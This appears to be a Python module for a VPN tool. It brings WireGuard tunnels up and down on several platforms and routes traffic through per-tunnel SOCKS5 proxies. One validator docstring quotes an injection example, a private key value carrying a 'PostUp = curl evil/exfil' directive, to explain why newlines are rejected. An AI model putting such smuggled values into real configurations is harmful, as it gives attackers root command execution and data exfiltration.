"""v3.43.60: WireGuard backend for the VPN tunnel manager.

Implements the backend contract from vpn.py:

    start(tunnel: Tunnel) -> bool
    stop(tunnel: Tunnel) -> bool
    is_running(tunnel: Tunnel) -> bool

Plus a module-level introspection helper:

    is_available() -> (bool, str)

# Lifecycle

start(tunnel):
  1. Render WireGuard .conf from tunnel.config (provider already populated it)
  2. Write the .conf to a temp dir (chmod 600 on POSIX)
  3. Windows: wireguard.exe /installtunnelservice <conf>
     POSIX:   wg-quick up <conf>
  4. Brief settle, then spawn a SOCKS5 proxy on tunnel.socks_port
     bound outbound to the wg interface IP from cfg["address"]
  5. Tunnel.public_ip is set to the wg interface IP (NOT the exit IP — the
     leak detector populates exit IP later by probing through the proxy)

stop(tunnel):
  - Stop the SOCKS5 proxy thread
  - Windows: wireguard.exe /uninstalltunnelservice <iface>
    POSIX:   wg-quick down <explicit-conf-path>
  - Remove the temp .conf

is_running(tunnel):
  - SOCKS5 proxy thread alive AND
  - wg interface still present with the expected IP

# Config schema (tunnel.config)

Required:
  private_key (str)        - this side's WG private key
  address (str)            - this side's tunnel IP, CIDR notation e.g. "10.66.123.45/32"
  peer_public_key (str)    - server's WG public key
  endpoint (str)           - "host:port" of the peer
Optional:
  dns (str)                - DNS server to use through the tunnel (leak prevention)
  preshared_key (str)      - PSK if the peer requires it
  allowed_ips (str)        - default "0.0.0.0/0,::/0"
  persistent_keepalive (int) - default 25
  mtu (int)                - usually omit; let wg pick

# Cross-platform

  Windows:  C:\\Program Files\\WireGuard\\wireguard.exe (official client).
            Tunnels run as Windows services. /installtunnelservice and
            /uninstalltunnelservice manage them.
  Linux:    wg-quick (apt install wireguard-tools). Requires root or
            CAP_NET_ADMIN. wg-quick up/down read/write /etc/wireguard/<n>.conf
            but we pass an explicit path.
  macOS:    wg-quick via homebrew works the same as Linux.

# Why we don't use OS routing instead of SOCKS

Two reasons:
  1. Per-tunnel routing on Windows requires netsh interface metric games
     that conflict with each other when multiple tunnels are up.
  2. We want per-site/per-worker tunnel selection. Playwright contexts
     take a SOCKS proxy parameter cleanly; OS routing would route ALL
     traffic from the host through whichever tunnel was "active", losing
     the per-site granularity that's the whole point of this feature.
"""
from __future__ import annotations

import os
import shutil
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path
from typing import Optional

from .vpn import Tunnel
from .vpn_socks import SocksProxy


# ─── Platform detection ─────────────────────────────────────────────

IS_WINDOWS = sys.platform.startswith("win")
IS_LINUX = sys.platform.startswith("linux")
IS_DARWIN = sys.platform == "darwin"

# On Windows we hide subprocess console windows.
_WIN_CREATE_FLAGS = 0
if IS_WINDOWS:
    _WIN_CREATE_FLAGS = getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000)


# ─── Tunables ───────────────────────────────────────────────────────

CONF_DIR = Path(tempfile.gettempdir()) / "bd_vpn_wg"
CONF_DIR.mkdir(mode=0o700, exist_ok=True)
if not IS_WINDOWS:
    try:
        os.chmod(CONF_DIR, 0o700)
    except OSError:
        pass

WG_UP_TIMEOUT_S = 30
WG_DOWN_TIMEOUT_S = 15

# Time we give the WireGuard interface to materialize before binding the
# SOCKS proxy to it. wg-quick is synchronous on Linux; on Windows the
# service-install command returns quickly but the actual TUN takes a moment.
IFACE_SETTLE_DELAY_S = 1.0


# ─── Binary detection ───────────────────────────────────────────────

def _find_wireguard_binary() -> Optional[str]:
    """Locate wireguard.exe (Windows) or wg-quick (POSIX)."""
    if IS_WINDOWS:
        candidates = [
            r"C:\Program Files\WireGuard\wireguard.exe",
            r"C:\Program Files (x86)\WireGuard\wireguard.exe",
        ]
        for p in candidates:
            if os.path.exists(p):
                return p
        return shutil.which("wireguard.exe")
    return shutil.which("wg-quick")


_WG_BINARY: Optional[str] = _find_wireguard_binary()


def is_available() -> tuple[bool, str]:
    """Cheap probe used by app.py at startup to expose availability via /api/vpn/status."""
    if _WG_BINARY and os.path.exists(_WG_BINARY):
        return True, f"using {_WG_BINARY}"
    if IS_WINDOWS:
        return False, "wireguard.exe not found (install from wireguard.com)"
    if IS_LINUX:
        return False, "wg-quick not found (apt install wireguard-tools)"
    return False, "wg-quick not found"


def refresh_binary_location() -> None:
    """Re-scan for the WG binary. Useful after a fresh install without restart."""
    global _WG_BINARY
    _WG_BINARY = _find_wireguard_binary()


# ─── Per-tunnel runtime handles ─────────────────────────────────────

# Keyed by tunnel_id. Each entry: {iface, socks_proxy, conf_path, bind_ip}.
_handles: dict[str, dict] = {}
_handles_lock = threading.Lock()


# ─── Backend contract: start / stop / is_running ────────────────────

def start(tunnel: Tunnel) -> bool:
    """Bring up the WG tunnel + SOCKS5 proxy."""
    if not _WG_BINARY:
        tunnel.last_error = "WireGuard binary not installed"
        return False
    if not tunnel.socks_port:
        tunnel.last_error = "no SOCKS port allocated by manager"
        return False

    # Audit 2026-05 / Phase 5: resolve @cred:* refs in tunnel.config
    # before rendering the .conf. Same root cause as vpn_openvpn.start():
    # the encrypted vault backend stores private_key/preshared_key as
    # "@cred:..." references; without this resolution, the rendered
    # WG .conf contains literal "@cred:..." strings as the PrivateKey
    # and PresharedKey values, which WireGuard rejects as invalid base64.
    from . import vpn_config as _vpn_cfg
    cfg = _vpn_cfg.resolve_secrets(tunnel.config or {})
    iface = _derive_iface_name(tunnel.tunnel_id)

    # Render .conf
    try:
        conf_text = render_conf(cfg)
    except ValueError as e:
        tunnel.last_error = f"invalid wg config: {e}"
        return False

    conf_path = CONF_DIR / f"{iface}.conf"
    try:
        fd = os.open(str(conf_path), os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        try:
            os.write(fd, conf_text.encode("utf-8"))
        finally:
            os.close(fd)
        if not IS_WINDOWS:
            try:
                os.chmod(conf_path, 0o600)
            except OSError:
                pass
    except OSError as e:
        tunnel.last_error = f"could not write conf {conf_path}: {e}"
        return False

    # Bring up wg
    try:
        _wg_up(conf_path, iface)
    except Exception as e:
        tunnel.last_error = f"wg up failed: {e}"
        _safe_unlink(conf_path)
        return False

    # Let the iface settle
    time.sleep(IFACE_SETTLE_DELAY_S)

    # Compute outbound bind IP from the configured Address.
    address = cfg.get("address", "")
    bind_ip = address.split("/")[0].strip() if address else ""
    if not bind_ip:
        tunnel.last_error = "no address in wg config"
        _wg_down_quiet(iface, conf_path)
        _safe_unlink(conf_path)
        return False

    # Verify the iface actually came up with that IP. Helps us fail fast
    # rather than spin up SOCKS that won't be able to bind.
    if not _iface_has_ip(iface, bind_ip):
        tunnel.last_error = f"wg iface {iface} did not come up with {bind_ip}"
        _wg_down_quiet(iface, conf_path)
        _safe_unlink(conf_path)
        return False

    # SOCKS proxy
    try:
        proxy = SocksProxy(
            listen_host="127.0.0.1",
            listen_port=tunnel.socks_port,
            outbound_bind_ip=bind_ip,
        )
        proxy.start()
    except OSError as e:
        tunnel.last_error = f"socks proxy bind failed: {e}"
        _wg_down_quiet(iface, conf_path)
        _safe_unlink(conf_path)
        return False

    # Record handles
    with _handles_lock:
        _handles[tunnel.tunnel_id] = {
            "iface": iface,
            "socks_proxy": proxy,
            "conf_path": conf_path,
            "bind_ip": bind_ip,
        }

    # tunnel-side IP. Real exit IP is filled in later by the leak detector.
    tunnel.public_ip = bind_ip
    return True


def stop(tunnel: Tunnel) -> bool:
    """Idempotent. Tears down SOCKS, brings WG down, removes conf."""
    with _handles_lock:
        handle = _handles.pop(tunnel.tunnel_id, None)
    if handle is None:
        return True

    proxy = handle.get("socks_proxy")
    if proxy is not None:
        try:
            proxy.stop()
        except Exception as e:
            sys.stderr.write(f"[vpn-wg] socks stop error: {e}\n")

    conf_path = handle.get("conf_path")
    iface = handle.get("iface")
    if iface:
        _wg_down_quiet(iface, conf_path)

    if conf_path is not None:
        _safe_unlink(conf_path)

    return True


def is_running(tunnel: Tunnel) -> bool:
    """Health-check predicate. Cheap (no network)."""
    with _handles_lock:
        handle = _handles.get(tunnel.tunnel_id)
    if not handle:
        return False
    proxy = handle.get("socks_proxy")
    if proxy is None or not proxy.is_alive():
        return False
    iface = handle.get("iface", "")
    bind_ip = handle.get("bind_ip", "")
    if not iface or not bind_ip:
        return False
    return _iface_has_ip(iface, bind_ip)


# ─── Config rendering ───────────────────────────────────────────────

REQUIRED_KEYS = ("private_key", "address", "peer_public_key", "endpoint")


def _reject_injection(field: str, value) -> str:
    """Audit 2026-05 / Phase 5: reject values containing newlines or INI
    section brackets before f-string interpolation into the .conf file.

    WireGuard .conf is an INI file that supports `PostUp = <shell command>`
    and `PreUp = <shell command>` directives executed by wg-quick (root).
    Without validation, a user pasting `"private_key": "ABC=\\nPostUp =
    curl evil/exfil"` gets root-level command execution when the tunnel
    starts.

    Conservative rejection list: \\n, \\r, \\0, '['. Forces every value
    onto a single line so an attacker can't open a new INI section or
    add a sibling directive.
    """
    if not isinstance(value, (str, int, float)):
        raise ValueError(
            f"WG config field {field!r} must be a string or number, got {type(value).__name__}"
        )
    s = str(value)
    bad = {"\n", "\r", "\x00", "["}
    if any(c in s for c in bad):
        raise ValueError(
            f"WG config field {field!r} contains forbidden character "
            f"(newline / null / bracket) — refusing to render .conf "
            f"that could inject PostUp/PreUp directives"
        )
    return s


def render_conf(cfg: dict) -> str:
    """Render a wg-quick-compatible .conf from a provider-supplied dict.

    Raises ValueError if required keys are missing or have empty values,
    or if any value contains characters that could inject a malicious
    PostUp / PreUp directive into the .conf file (audit 2026-05).
    """
    if not isinstance(cfg, dict):
        raise ValueError("config must be a dict")
    missing = [k for k in REQUIRED_KEYS if not cfg.get(k)]
    if missing:
        raise ValueError(f"missing required keys: {missing}")

    # Validate every field that lands in an f-string.
    priv = _reject_injection("private_key", cfg["private_key"])
    addr = _reject_injection("address", cfg["address"])
    peer_pub = _reject_injection("peer_public_key", cfg["peer_public_key"])
    endpoint = _reject_injection("endpoint", cfg["endpoint"])
    dns = cfg.get("dns")
    if dns:
        dns = _reject_injection("dns", dns)
    mtu = cfg.get("mtu")
    if mtu:
        mtu_int = int(mtu)  # raises if non-int
    psk = cfg.get("preshared_key")
    if psk:
        psk = _reject_injection("preshared_key", psk)
    allowed = _reject_injection("allowed_ips", cfg.get("allowed_ips", "0.0.0.0/0,::/0"))
    keepalive = int(cfg.get("persistent_keepalive", 25))

    lines: list[str] = []
    lines.append("[Interface]")
    lines.append(f"PrivateKey = {priv}")
    lines.append(f"Address = {addr}")
    if dns:
        lines.append(f"DNS = {dns}")
    if mtu:
        lines.append(f"MTU = {mtu_int}")
    lines.append("")
    lines.append("[Peer]")
    lines.append(f"PublicKey = {peer_pub}")
    if psk:
        lines.append(f"PresharedKey = {psk}")
    lines.append(f"Endpoint = {endpoint}")
    lines.append(f"AllowedIPs = {allowed}")
    lines.append(f"PersistentKeepalive = {keepalive}")
    return "\n".join(lines) + "\n"


# ─── Helpers ────────────────────────────────────────────────────────

def _derive_iface_name(tunnel_id: str) -> str:
    """Linux iface names cap at 15 chars; we prefix 'wg-' and keep 11 of the id."""
    suffix = tunnel_id
    for prefix in ("tun-", "tun_"):
        if suffix.startswith(prefix):
            suffix = suffix[len(prefix):]
            break
    suffix = "".join(c for c in suffix if c.isalnum())[:11]
    if not suffix:
        suffix = "anon"
    return f"wg-{suffix}"


def _wg_up(conf_path: Path, iface: str) -> None:
    if IS_WINDOWS:
        cmd = [_WG_BINARY, "/installtunnelservice", str(conf_path)]
    else:
        cmd = [_WG_BINARY, "up", str(conf_path)]
    result = subprocess.run(
        cmd,
        capture_output=True,
        timeout=WG_UP_TIMEOUT_S,
        creationflags=_WIN_CREATE_FLAGS,
    )
    if result.returncode != 0:
        stderr = (result.stderr or b"").decode("utf-8", errors="replace")
        raise RuntimeError(f"wg up exit={result.returncode}: {stderr[:400]}")


def _is_safe_link_delete_iface(iface: str) -> bool:
    """Allow direct link deletion only for names produced by this backend."""
    suffix = iface[3:] if iface.startswith("wg-") else ""
    return (
        bool(suffix)
        and len(iface) <= 15
        and suffix.isascii()
        and suffix.isalnum()
    )


def _wg_down_quiet(iface: str, conf_path: Path | str | None = None) -> None:
    """Try to tear down WireGuard. Log on failure, never raise."""
    try:
        if IS_WINDOWS:
            cmd = [_WG_BINARY, "/uninstalltunnelservice", iface]
        else:
            explicit_conf = Path(conf_path) if conf_path is not None else None
            if explicit_conf is not None and explicit_conf.is_file():
                cmd = [_WG_BINARY, "down", str(explicit_conf)]
            elif IS_LINUX and _is_safe_link_delete_iface(iface):
                # wg-quick cannot resolve our temp config by interface name.
                # If the exact config disappeared, delete only an interface
                # whose name matches the backend's tightly bounded namespace.
                cmd = ["ip", "link", "delete", "dev", iface]
            else:
                sys.stderr.write(
                    f"[vpn-wg] down {iface} refused: explicit config missing "
                    "and no guarded link-delete fallback is available\n"
                )
                return
        result = subprocess.run(
            cmd,
            capture_output=True,
            timeout=WG_DOWN_TIMEOUT_S,
            creationflags=_WIN_CREATE_FLAGS,
        )
        if result.returncode != 0:
            stderr = (result.stderr or b"").decode("utf-8", errors="replace")
            sys.stderr.write(
                f"[vpn-wg] down {iface} exit={result.returncode}: {stderr[:200]}\n"
            )
    except subprocess.TimeoutExpired:
        sys.stderr.write(f"[vpn-wg] down {iface} timed out\n")
    except Exception as e:
        sys.stderr.write(f"[vpn-wg] down {iface} raised: {e}\n")


def _iface_has_ip(iface: str, expected_ip: str) -> bool:
    """Check whether the named iface currently has the expected IP assigned.

    Cross-platform best-effort:
      Windows: parse `ipconfig` output. WireGuard names adapters after the
               tunnel, so the iface name shows up in the adapter section.
      Linux:   `ip -4 -o addr show dev <iface>` (or `ip a` fallback).
      macOS:   `ifconfig <iface>`.
    """
    if not expected_ip:
        return False
    try:
        if IS_WINDOWS:
            result = subprocess.run(
                ["ipconfig"],
                capture_output=True, timeout=5,
                creationflags=_WIN_CREATE_FLAGS,
                text=True,
            )
            return expected_ip in (result.stdout or "")
        if IS_LINUX:
            result = subprocess.run(
                ["ip", "-4", "-o", "addr", "show", "dev", iface],
                capture_output=True, timeout=5, text=True,
            )
            if result.returncode == 0:
                return expected_ip in (result.stdout or "")
            # Fallback: scan all interfaces
            result = subprocess.run(
                ["ip", "-4", "-o", "addr"],
                capture_output=True, timeout=5, text=True,
            )
            return (iface in (result.stdout or "")) and (expected_ip in (result.stdout or ""))
        if IS_DARWIN:
            result = subprocess.run(
                ["ifconfig", iface],
                capture_output=True, timeout=5, text=True,
            )
            return expected_ip in (result.stdout or "")
    except subprocess.TimeoutExpired:
        return False
    except Exception:
        return False
    return False


def _safe_unlink(path: Path) -> None:
    try:
        if path.exists():
            path.unlink()
    except OSError:
        pass


# ─── Introspection (tests + UI diagnostics) ─────────────────────────

def _active_handles() -> dict[str, dict]:
    """Test helper: snapshot of active handles (with proxies as objects)."""
    with _handles_lock:
        return dict(_handles)


def _reset_for_tests() -> None:
    """Test teardown. Stops every SOCKS proxy in the registry, clears it."""
    with _handles_lock:
        handles = list(_handles.values())
        _handles.clear()
    for h in handles:
        proxy = h.get("socks_proxy")
        if proxy is not None:
            try:
                proxy.stop()
            except Exception:
                pass


__all__ = [
    "start", "stop", "is_running",
    "is_available", "refresh_binary_location",
    "render_conf",
]
